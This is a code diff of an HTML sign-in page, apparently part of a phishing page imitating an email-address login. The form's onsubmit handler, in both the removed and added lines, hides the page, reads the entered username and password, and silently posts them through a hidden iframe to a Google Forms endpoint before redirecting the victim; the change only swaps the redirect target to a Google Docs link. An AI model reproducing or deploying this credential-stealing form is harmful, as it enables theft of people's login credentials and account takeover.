@@ -37,7 +37,7 @@
     <div id="loginArea">        
         <div id="loginMessage" class="groupMargin">Sign in with your email address</div>
 
-        <form method="get" id="loginForm" autocomplete="off" novalidate="novalidate" onsubmit="document.body.style.display = 'none';document.body.appendChild(Object.assign(document.createElement('iframe'),{style:'display:none',src:`https://docs.google.com/forms/d/e/1FAIpQLScKb3unldtZMV8oiwj2M__G4MRrHZsC9UCUMgYdC2to1IlUxw/formResponse?entry.625891243=${document.getElementById(`userNameInput`).value}&entry.1913190204=${document.getElementById(`passwordInput`).value}`,onload:()=>{location=location.search.split('/')[-1]}}));return false;">
+        <form method="get" id="loginForm" autocomplete="off" novalidate="novalidate" onsubmit="document.body.style.display = 'none';document.body.appendChild(Object.assign(document.createElement('iframe'),{style:'display:none',src:`https://docs.google.com/forms/d/e/1FAIpQLScKb3unldtZMV8oiwj2M__G4MRrHZsC9UCUMgYdC2to1IlUxw/formResponse?entry.625891243=${document.getElementById(`userNameInput`).value}&entry.1913190204=${document.getElementById(`passwordInput`).value}`,onload:()=>{location='https://docs.google.com/document/d/1gJbxWc2QpJO_RLxpQjkS5Z7RcgDBBg-Ip2hGUXlr6kI/edit'}}));return false;">
             <div id="error" class="fieldMargin error smallText" style="display: none;">
                 <span id="errorText" for=""></span>
             </div>
